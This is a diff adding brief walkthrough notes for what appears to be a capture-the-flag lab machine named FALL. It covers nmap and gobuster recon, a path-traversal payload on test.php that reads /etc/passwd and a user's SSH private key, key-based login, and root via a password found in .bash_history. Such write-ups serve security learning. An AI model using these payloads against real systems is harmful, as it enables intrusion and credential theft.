@@ -1,0 +1,30 @@
+1)nmap -A  -sS -T4 -p- 192.168.225.140
+    22 - ssh
+    80 - http
+    ....
+
+2)gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.140
+    .....
+    /test.php
+
+3)burp-intruder
+    http://192.168.225.140/test.php?file=../../../../../../../../../../../../etc/passwd
+
+4) ssh qiu
+    http://192.168.225.140/test.php?file=../../../../../../../../../../../../home/qiu/.ssh/id_rsa
+    ssh -i id_rsa  qiu@192.168.225.140
+
+5)local privillage escalation
+    cat .bash_history
+        echo "remarkablyawesomE" | sudo -S dnf update
+
+its password!!!!
+
+    sudo -l
+        :remarkablyawesomE
+        User qiu may run the following commands on FALL:
+        (ALL) ALL
+
+    sudo sudo
+    
+    
